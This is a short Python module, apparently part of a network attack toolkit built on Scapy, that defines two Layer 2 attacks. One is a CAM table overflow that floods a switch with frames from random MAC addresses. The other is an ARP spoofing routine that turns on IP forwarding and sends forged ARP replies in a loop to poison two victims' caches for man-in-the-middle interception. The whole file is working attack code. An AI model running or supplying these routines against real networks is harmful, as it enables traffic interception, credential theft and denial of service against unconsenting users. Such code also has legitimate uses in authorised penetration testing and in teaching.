import os
from scapy.layers.l2 import Ether, ARP, getmacbyip
from scapy.volatile import RandMAC
from scapy.sendrecv import send
from scapy.all import get_if_hwaddr, get_if_addr

from libs.aux_funcs import type_wrapper,attack_layer,attack_cat,attack_type, send_l2_loop



@type_wrapper(category = attack_cat.Attack, name = "CAM Overflow", type = attack_type.DoS, layer = attack_layer.L2, arg_list=[])
def cam_overflow(args):
    """Performs a CAM Overflow attack from the selected interface."""
    args['pkt'] = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC())
    send_l2_loop(args)
    return args


@type_wrapper(category = attack_cat.Attack, name = "ARP Spoofing", type = attack_type.MitM, layer = attack_layer.L2, arg_list=["victim_1_IP","victim_2_IP"])
def arp_spoofing(args):
    """Performs an ARP Spoofing attack from the selected interface. Will poison ARP tables for the two selected hosts."""
    iface = args["iface"]
    mac_1 = getmacbyip(args['victim_1_IP'])
    mac_2 = getmacbyip(args['victim_2_IP'])

    # Enable IP forwarding and disable ICMP redirects
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system(f"echo 0 > /proc/sys/net/ipv4/conf/{iface}/send_redirects")
    os.system("echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects")

    # Craft the ARP packets
    p1 = ARP(op=2, hwdst=mac_1, psrc=args["victim_2_IP"], pdst=args["victim_1_IP"])
    p2 = ARP(op=2, hwdst=mac_2, psrc=args["victim_1_IP"], pdst=args["victim_2_IP"])

    # Send ARP packets in a loop
    try:
        send([p1,p2], iface=iface, inter = 1, loop = 1)
    except KeyboardInterrupt:
        # Disable IP forwarding and enable ICMP redirects
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        os.system(f"echo 1 > /proc/sys/net/ipv4/conf/{iface}/send_redirects")
        os.system("echo 1 > /proc/sys/net/ipv4/conf/all/send_redirects")
        return args
